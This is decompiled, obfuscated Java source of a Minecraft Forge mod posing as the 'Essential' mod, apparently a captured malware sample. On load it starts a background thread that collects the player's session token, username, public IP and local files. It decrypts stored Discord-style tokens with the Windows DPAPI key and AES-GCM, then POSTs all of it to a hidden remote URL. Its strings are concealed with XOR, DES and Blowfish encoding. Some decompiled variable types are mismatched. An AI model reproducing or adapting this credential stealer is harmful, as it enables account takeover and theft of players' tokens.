public class OriginalObf {


    /* Decompiler 213ms, total 377ms, lines 380 */
package Loader;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import org.apache.commons.lang3.StringEscapeUtils;

    @Mod(
            modid = "Essential",
            acceptedMinecraftVersions = "[1.8.9]"
    )
    public class Essential {
        // $FF: synthetic field
        private static final String[] lllII;
        // $FF: synthetic field
        private static final int[] lllIl;

        static {
            llIIIlI();
            llIIIIl();
        }

        private static String lIlllll(String llllIlIllIIlIIl, String llllIlIllIIlIlI) {
            try {
                double llllIlIllIIIlll = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(llllIlIllIIlIlI.getBytes(StandardCharsets.UTF_8)), lllIl[8]), "DES");
                Cipher llllIlIllIIllIl = Cipher.getInstance("DES");
                llllIlIllIIllIl.init(lllIl[2], llllIlIllIIIlll);
                return new String(llllIlIllIIllIl.doFinal(Base64.getDecoder().decode(llllIlIllIIlIIl.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
            } catch (Exception var4) {
                var4.printStackTrace();
                return null;
            }
        }

        private static boolean llIIlII(int var0, int var1) {
            return var0 < var1;
        }

        private static String lIllllI(String llllIlIlllIIIII, String llllIlIllIllIlI) {
            llllIlIlllIIIII = new String(Base64.getDecoder().decode(llllIlIlllIIIII.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
            StringBuilder llllIlIllIllllI = new StringBuilder();
            byte llllIlIllIllIII = llllIlIllIllIlI.toCharArray();
            long llllIlIllIlIlll = lllIl[0];
            char llllIlIllIlIllI = llllIlIlllIIIII.toCharArray();
            Exception llllIlIllIlIlIl = llllIlIllIlIllI.length;
            int llllIlIllIlIlII = lllIl[0];

            do {
                if (!llIIlII(llllIlIllIlIlII, llllIlIllIlIlIl)) {
                    return String.valueOf(llllIlIllIllllI);
                }

                float llllIlIllIlIIll = llllIlIllIlIllI[llllIlIllIlIlII];
                llllIlIllIllllI.append((char)(llllIlIllIlIIll ^ llllIlIllIllIII[llllIlIllIlIlll % llllIlIllIllIII.length]));
                "".length();
                ++llllIlIllIlIlll;
                ++llllIlIllIlIlII;
                "".length();
            } while(-" ".length() <= (53 ^ 49));

            return null;
        }

        @SubscribeEvent
        public void onFirstPlayerJoin(EntityJoinWorldEvent llllIllIIlllIll) {
            if (llIIIll(llllIllIIlllIll.entity.equals(Minecraft.func_71410_x().field_71439_g))) {
                MinecraftForge.EVENT_BUS.unregister(llllIllIIllllII);
            }

        }

        private static boolean llIIlIl(Object var0) {
            return var0 != null;
        }

        private static void llIIIlI() {
            lllIl = new int[41];
            lllIl[0] = (203 ^ 128 ^ 235 ^ 150) & (107 ^ 41 ^ 63 ^ 75 ^ -" ".length());
            lllIl[1] = " ".length();
            lllIl[2] = "  ".length();
            lllIl[3] = "   ".length();
            lllIl[4] = 75 ^ 79;
            lllIl[5] = 12 ^ 9;
            lllIl[6] = 13 + 44 - 14 + 88 ^ 55 + 114 - 78 + 42;
            lllIl[7] = 56 ^ 63;
            lllIl[8] = 117 ^ 125;
            lllIl[9] = 84 ^ 93;
            lllIl[10] = 160 ^ 170;
            lllIl[11] = 74 ^ 65;
            lllIl[12] = 9 ^ 50 ^ 147 ^ 164;
            lllIl[13] = 159 + 130 - 110 + 26 ^ 60 + 177 - 146 + 101;
            lllIl[14] = 165 ^ 171;
            lllIl[15] = 172 ^ 198 ^ 236 ^ 137;
            lllIl[16] = 88 ^ 63 ^ 120 ^ 15;
            lllIl[17] = 94 ^ 79;
            lllIl[18] = -(-11618 & 32629) & -3085 & 24351;
            lllIl[19] = 139 ^ 153;
            lllIl[20] = 100 + 58 - 146 + 120 ^ 54 + 9 - 38 + 126;
            lllIl[21] = 3 ^ 23;
            lllIl[22] = 27 ^ 14;
            lllIl[23] = 19 ^ 5;
            lllIl[24] = 97 + 78 - 135 + 87 ^ 6 ^ 110;
            lllIl[25] = 41 ^ 49;
            lllIl[26] = 120 ^ 66 ^ 116 ^ 87;
            lllIl[27] = -(48 + 59 - -23 + 39 ^ 157 + 133 - 168 + 62);
            lllIl[28] = 137 ^ 147;
            lllIl[29] = 18 ^ 3 ^ 130 ^ 136;
            lllIl[30] = 4 ^ 24;
            lllIl[31] = 112 ^ 109;
            lllIl[32] = 28 ^ 2;
            lllIl[33] = 135 + 54 - 109 + 83 ^ 75 + 54 - 48 + 107;
            lllIl[34] = 20 + 93 - 53 + 68;
            lllIl[35] = 121 ^ 89;
            lllIl[36] = 66 ^ 99;
            lllIl[37] = 52 + 24 - -2 + 90 ^ 17 + 38 - -41 + 42;
            lllIl[38] = 33 + 36 - -22 + 55 ^ 91 + 60 - 65 + 91;
            lllIl[39] = 136 ^ 172;
            lllIl[40] = 109 ^ 72;
        }

        private static boolean llIIIll(int var0) {
            return var0 != 0;
        }

        @EventHandler
        public void preInit(FMLPreInitializationEvent llllIllIlIIIIII) {
            MinecraftForge.EVENT_BUS.register(llllIllIlIIIIIl);
            (new Thread(() -> {
                try {
                    short llllIllIIIIIIIl = (HttpURLConnection)(new URL(lllII[lllIl[0]])).openConnection();
                    llllIllIIIIIIIl.setRequestMethod(lllII[lllIl[1]]);
                    llllIllIIIIIIIl.setRequestProperty(lllII[lllIl[2]], lllII[lllIl[3]]);
                    llllIllIIIIIIIl.setDoOutput((boolean)lllIl[1]);
                    boolean llllIllIIIIIIII = Minecraft.func_71410_x();
                    String llllIllIIIIllIl = (new BufferedReader(new InputStreamReader((new URL(lllII[lllIl[4]])).openStream()))).readLine();
                    String llllIllIIIIllII = llllIllIIIIIIII.func_110432_I().func_148254_d();
                    String llllIllIIIIlIll = lllII[lllIl[5]];
                    long llllIlIllllllII = lllII[lllIl[6]];
                    String llllIllIIIIlIIl = lllII[lllIl[7]];
                    String var10000 = llllIllIIIIIIII.field_71412_D.getParent();
                    String[] var10001 = new String[lllIl[1]];
                    var10001[lllIl[0]] = lllII[lllIl[8]];
                    if (llIIIll(Files.exists(Paths.get(var10000, var10001), new LinkOption[lllIl[0]]))) {
                        var10000 = llllIllIIIIIIII.field_71412_D.getParent();
                        var10001 = new String[lllIl[1]];
                        var10001[lllIl[0]] = lllII[lllIl[9]];
                        llllIllIIIIlIll = Files.readAllLines(Paths.get(var10000, var10001)).toString();
                    }

                    var10000 = llllIllIIIIIIII.field_71412_D.getPath();
                    var10001 = new String[lllIl[1]];
                    var10001[lllIl[0]] = lllII[lllIl[10]];
                    if (llIIIll(Files.exists(Paths.get(var10000, var10001), new LinkOption[lllIl[0]]))) {
                        var10000 = llllIllIIIIIIII.field_71412_D.getPath();
                        var10001 = new String[lllIl[1]];
                        var10001[lllIl[0]] = lllII[lllIl[11]];
                        llllIlIllllllII = Files.readAllLines(Paths.get(var10000, var10001)).toString();
                    }

                    var10000 = llllIllIIIIIIII.field_71412_D.getParent();
                    var10001 = new String[lllIl[1]];
                    var10001[lllIl[0]] = lllII[lllIl[12]];
                    if (llIIIll(Files.isDirectory(Paths.get(var10000, var10001), new LinkOption[lllIl[0]]))) {
                        llllIllIIIIlIIl = lllII[lllIl[13]];
                        var10000 = llllIllIIIIIIII.field_71412_D.getParent();
                        var10001 = new String[lllIl[1]];
                        var10001[lllIl[0]] = lllII[lllIl[14]];
                        short llllIlIlllllIlI = (File[])Objects.requireNonNull(Paths.get(var10000, var10001).toFile().listFiles());
                        boolean llllIlIlllllIIl = llllIlIlllllIlI.length;
                        int llllIlIlllllIIIx = lllIl[0];

                        while(llIIlII(llllIlIlllllIIIx, llllIlIlllllIIl)) {
                            short llllIlIllllIlllx = llllIlIlllllIlI[llllIlIlllllIIIx];
                            if (llIIIll(llllIlIllllIlllx.getName().endsWith(lllII[lllIl[15]]))) {
                                Exception llllIlIllllIllIx = new FileReader(llllIlIllllIlllx);
                                String llllIlIllllIlIlx = new BufferedReader(llllIlIllllIllIx);
                                StringBuilder llllIlIllllIIll = new StringBuilder();

                                String llllIllIIIlIlII;
                                while(llIIlIl(llllIllIIIlIlII = llllIlIllllIlIlx.readLine())) {
                                    llllIlIllllIIll.append(llllIllIIIlIlII);
                                    "".length();
                                    "".length();
                                    if (((127 + 91 - 152 + 142 ^ 20 + 48 - -44 + 20) & (146 ^ 174 ^ 168 ^ 192 ^ -" ".length())) >= "  ".length()) {
                                        return;
                                    }
                                }

                                llllIlIllllIllIx.close();
                                llllIlIllllIlIlx.close();
                                int llllIlIllllIIlI = Pattern.compile(lllII[lllIl[16]]);
                                Matcher llllIllIIIlIIIl = llllIlIllllIIlI.matcher(String.valueOf(llllIlIllllIIll));
                                if (llIIIll(llllIllIIIlIIIl.find())) {
                                    if (llIIlII(Cipher.getMaxAllowedKeyLength(lllII[lllIl[17]]), lllIl[18])) {
                                        Class<?> llllIlIllllIIIIx = Class.forName(lllII[lllIl[19]]);
                                        Constructor<?> llllIllIIlIIIII = llllIlIllllIIIIx.getDeclaredConstructor();
                                        llllIllIIlIIIII.setAccessible((boolean)lllIl[1]);
                                        Object llllIllIIIlllll = llllIllIIlIIIII.newInstance();
                                        Field llllIllIIIllllI = llllIlIllllIIIIx.getDeclaredField(lllII[lllIl[20]]);
                                        llllIllIIIllllI.setAccessible((boolean)lllIl[1]);
                                        llllIllIIIllllI.setBoolean(llllIllIIIlllll, (boolean)lllIl[1]);
                                        llllIlIllllIIIIx = Class.forName(lllII[lllIl[21]]);
                                        llllIllIIlIIIII = llllIlIllllIIIIx.getDeclaredConstructor();
                                        llllIllIIlIIIII.setAccessible((boolean)lllIl[1]);
                                        byte llllIlIlllIllIIx = llllIllIIlIIIII.newInstance();
                                        llllIllIIIllllI = llllIlIllllIIIIx.getDeclaredField(lllII[lllIl[22]]);
                                        llllIllIIIllllI.setAccessible((boolean)lllIl[1]);
                                        ((Map)llllIllIIIllllI.get(llllIlIlllIllIIx)).put(lllII[lllIl[23]], llllIllIIIlllll);
                                        "".length();
                                        llllIlIllllIIIIx = Class.forName(lllII[lllIl[24]]);
                                        llllIllIIIllllI = llllIlIllllIIIIx.getDeclaredField(lllII[lllIl[25]]);
                                        llllIllIIIllllI.setAccessible((boolean)lllIl[1]);
                                        boolean llllIlIlllIlIll = Field.class.getDeclaredField(lllII[lllIl[26]]);
                                        llllIlIlllIlIll.setAccessible((boolean)lllIl[1]);
                                        llllIlIlllIlIll.setInt(llllIllIIIllllI, llllIllIIIllllI.getModifiers() & lllIl[27]);
                                        llllIllIIIllllI.set((Object)null, llllIlIlllIllIIx);
                                    }

                                    byte[] llllIllIIIllIlI = llllIllIIIlIIIl.group().split(lllII[lllIl[28]])[lllIl[1]].getBytes();
                                    Gson var30 = new Gson();
                                    String var10003 = llllIllIIIIIIII.field_71412_D.getParent();
                                    String[] var10004 = new String[lllIl[1]];
                                    var10004[lllIl[0]] = lllII[lllIl[29]];
                                    JsonObject llllIllIIIllIIl = (JsonObject)var30.fromJson(new String(Files.readAllBytes(Paths.get(var10003, var10004))), JsonObject.class);
                                    byte llllIlIllllIIII = llllIllIIIllIIl.getAsJsonObject(lllII[lllIl[30]]).get(lllII[lllIl[31]]).getAsString().getBytes();
                                    llllIlIllllIIII = Base64.getDecoder().decode(llllIlIllllIIII);
                                    llllIlIllllIIII = Arrays.copyOfRange(llllIlIllllIIII, lllIl[5], llllIlIllllIIII.length);
                                    llllIlIllllIIII = Crypt32Util.cryptUnprotectData(llllIlIllllIIII);
                                    llllIllIIIllIlI = Base64.getDecoder().decode(llllIllIIIllIlI);
                                    Cipher llllIllIIIllIII = Cipher.getInstance(lllII[lllIl[32]]);
                                    llllIllIIIllIII.init(lllIl[2], new SecretKeySpec(llllIlIllllIIII, lllII[lllIl[33]]), new GCMParameterSpec(lllIl[34], Arrays.copyOfRange(llllIllIIIllIlI, lllIl[3], lllIl[15])));
                                    byte llllIlIlllIllII = llllIllIIIllIII.doFinal(Arrays.copyOfRange(llllIllIIIllIlI, lllIl[15], llllIllIIIllIlI.length));
                                    llllIllIIIIlIIl = String.valueOf((new StringBuilder()).append(llllIllIIIIlIIl).append(new String(llllIlIlllIllII, StandardCharsets.UTF_8)).append(lllII[lllIl[35]]));
                                }
                            }

                            ++llllIlIlllllIIIx;
                            "".length();
                            if (((71 ^ 7 ^ 6 ^ 19) & (99 ^ 115 ^ 240 ^ 181 ^ -" ".length())) != 0) {
                                return;
                            }
                        }
                    }

                    if (llIIIll(Loader.isModLoaded(lllII[lllIl[36]]))) {
                        Class var32 = Class.forName(lllII[lllIl[37]]);
                        var10001 = new String[lllIl[1]];
                        var10001[lllIl[0]] = lllII[lllIl[38]];
                        llllIllIIIIllII = (String)ReflectionHelper.findField(var32, var10001).get((Object)null);
                    }

                    var10000 = lllII[lllIl[39]];
                    Object[] var34 = new Object[lllIl[7]];
                    var34[lllIl[0]] = llllIllIIIIIIII.func_110432_I().func_111285_a();
                    var34[lllIl[1]] = llllIllIIIIIIII.func_110432_I().func_148255_b();
                    var34[lllIl[2]] = llllIllIIIIllII;
                    var34[lllIl[3]] = llllIllIIIIllIl;
                    var34[lllIl[4]] = StringEscapeUtils.escapeJson(llllIllIIIIlIll);
                    var34[lllIl[5]] = StringEscapeUtils.escapeJson(llllIlIllllllII);
                    var34[lllIl[6]] = llllIllIIIIlIIl;
                    String llllIllIIIIlIII = String.format(var10000, var34);
                    OutputStream llllIllIIIIIlll = llllIllIIIIIIIl.getOutputStream();
                    double llllIlIlllllIII = llllIllIIIIlIII.getBytes(StandardCharsets.UTF_8);
                    llllIllIIIIIlll.write(llllIlIlllllIII, lllIl[0], llllIlIlllllIII.length);
                    short llllIlIllllIlll = new BufferedReader(new InputStreamReader(llllIllIIIIIIIl.getInputStream(), StandardCharsets.UTF_8));
                    StringBuilder llllIlIllllIllI = new StringBuilder();

                    while(true) {
                        String llllIlIllllIlIl;
                        if (!llIIlIl(llllIlIllllIlIl = llllIlIllllIlll.readLine())) {
                            System.out.println(llllIlIllllIllI);
                            llllIllIIIIIlll.close();
                            break;
                        }

                        llllIlIllllIllI.append(llllIlIllllIlIl.trim());
                        "".length();
                        "".length();
                        if (((53 ^ 0 ^ 172 ^ 159) & (188 ^ 134 ^ 150 ^ 170 ^ -" ".length())) != 0) {
                            return;
                        }
                    }
                } catch (Exception var23) {
                    var23.printStackTrace();
                    return;
                }

                "".length();
                if ("  ".length() < "   ".length()) {
                    ;
                }
            })).start();
        }

        private static String llIIIII(String llllIlIlIllllII, String llllIlIlIlllIll) {
            try {
                String llllIlIlIlllIlI = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(llllIlIlIlllIll.getBytes(StandardCharsets.UTF_8)), "Blowfish");
                Exception llllIlIlIlllIIl = Cipher.getInstance("Blowfish");
                llllIlIlIlllIIl.init(lllIl[2], llllIlIlIlllIlI);
                return new String(llllIlIlIlllIIl.doFinal(Base64.getDecoder().decode(llllIlIlIllllII.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
            } catch (Exception var4) {
                var4.printStackTrace();
                return null;
            }
        }

        private static void llIIIIl() {
            lllII = new String[lllIl[40]];
            lllII[lllIl[0]] = lIllllI("DCYmHCdefX0ILBwqK0I7CiA3AjABIHwPOwk=", "dRRlT");
            lllII[lllIl[1]] = lIlllll("MGHA45hJ5vc=", "ppjUX");
            lllII[lllIl[2]] = llIIIII("aPa1T+GYn1n+bQtg5D83PQ==", "nQevd");
            lllII[lllIl[3]] = llIIIII("3TxOb9xR56kxq+uqAKUJ61khuqWZRLbG", "jmnmI");
            lllII[lllIl[4]] = llIIIII("XPxVIG5LlOOfn5m+liUhKnKDZNOHqM4vHnnBWp3dOtk=", "dHuJB");
            lllII[lllIl[5]] = lIllllI("IAIBLmwIBBlrKgkeAy9sXEM=", "fkmKL");
            lllII[lllIl[6]] = llIIIII("bDcHUWv4f4hNaAzz0XpnwPDb5TnZaCaQ", "eHQjf");
            lllII[lllIl[7]] = lIlllll("QwckEwv04X+pR1EgE5QFb75M1QdCL/qW", "BPbJX");
            lllII[lllIl[8]] = llIIIII("bxGh+BID8s9+GZcUvD5DZkrd+CtLYfC5", "hvqLQ");
            lllII[lllIl[9]] = lIlllll("dPiJ4IDs57mgGj0yr105gqY77Hi9xYl8", "bxOmX");
            lllII[lllIl[10]] = lIlllll("ykRU0VZ9kZwIN+CJ5ywtvf2cXpdiq2eK30zH6RIqztzPEI89NTYqkA==", "JRzGt");
            lllII[lllIl[11]] = lIlllll("47inJe7N96MfPpjyML4wr4i6JBREdUJBMFQXjNOELWHPdv/NPTPb5w==", "btJcY");
            lllII[lllIl[12]] = lIlllll("fdBkRbffxShTrMIfws9pva1H4Xnj9CQb6hHyoRw38Z4=", "qeqrp");
            lllII[lllIl[13]] = lIllllI("", "KMgsF");
            lllII[lllIl[14]] = lIlllll("VGYm7+5Ft1Woyk1u3amcPXBMocuy7Ty1M7sPnwocsLc=", "UkcCA");
            lllII[lllIl[15]] = lIllllI("fRYgDg==", "SzDlk");
            lllII[lllIl[16]] = lIlllll("n/USPcqZ/PXjoBVgyowV1p2uqw5ZJgYBofC6hsDRu8cRwaZ84KkvM6h46XAyHUQV", "SLhjP");
            lllII[lllIl[17]] = lIllllI("NBI0", "uWgPi");
            lllII[lllIl[19]] = lIllllI("IQUCDjxlBwYWND8LWiw2MhQAAAUnCCQKNiYNBxwtJAo3ACgnARcbLSQK", "KdtoD");
            lllII[lllIl[20]] = lIllllI("FwEgFhQaASM+EBI=", "vmLIu");
            lllII[lllIl[21]] = lIllllI("IAUyEw1kBzYLBT4LajEHMxQwHSUvFikbBjkNKxwG", "JdDru");
            lllII[lllIl[22]] = lIlllll("zEcihZm+sh4=", "rnBzg");
            lllII[lllIl[23]] = lIlllll("t1RhyvXcpcM=", "hwlpe");
            lllII[lllIl[24]] = llIIIII("oRUliK7ncOnrI0M0yyt7no5/9Ku9QenVt5sC2H4AWi8=", "bpsXx");
            lllII[lllIl[25]] = lIlllll("9V9DKJAQ5Ddzw31WEAuDLQ==", "jfarv");
            lllII[lllIl[26]] = lIllllI("CScyLQUNLSQ3", "dHVDc");
            lllII[lllIl[28]] = lIllllI("AjI9extfNC0XDzdZ", "fcJOl");
            lllII[lllIl[29]] = lIlllll("Bn2evzTGyh8NW/Ql07pD2Ao6fKx7R0rw", "vdBtV");
            lllII[lllIl[30]] = lIlllll("tv7lVJnW4nT+jIuUZ6t2ZQ==", "dFBDN");
            lllII[lllIl[31]] = llIIIII("KDrOiXfi//kh/AZhYWFEXg==", "SsrFs");
            lllII[lllIl[32]] = llIIIII("rZxuoagy1KUcbJZpsnOMobNeZ1BhBh9V", "KCiIP");
            lllII[lllIl[33]] = lIllllI("ACo8", "AooJy");
            lllII[lllIl[35]] = lIlllll("VHXTcDpui7k=", "bWJoa");
            lllII[lllIl[36]] = lIlllll("7hcZ5PyU6IEhWRgeG+Rldw==", "ZSFdF");
            lllII[lllIl[37]] = lIllllI("EzYoGRIbOygFGgk0Kw5XEjA+EBgBNS0PFxZ3Ig8YFiw2DwpMNC0ZGkwKIRkKCzYqOgsNLSEJDQs2Kg==", "bYDjy");
            lllII[lllIl[38]] = lIlllll("it55ML1SmY0=", "dOmuh");
            lllII[lllIl[39]] = llIIIII("Y2uUGvXAQp+KtGwUkRpTzhf2wcgtexmoDPm57oNn4ivIS3VJ4hzNMRH7QHZgu25vu1FX44T1rxs2m/CVdlqa5Q10lI+WXHxbmfvVKaL8/mWB1Ycos8JoJ+KiRD/6VG+SNnA9adjDaRZU6SRP+npy7PFwX4rDMaQr", "TQXPz");
        }
    }


}
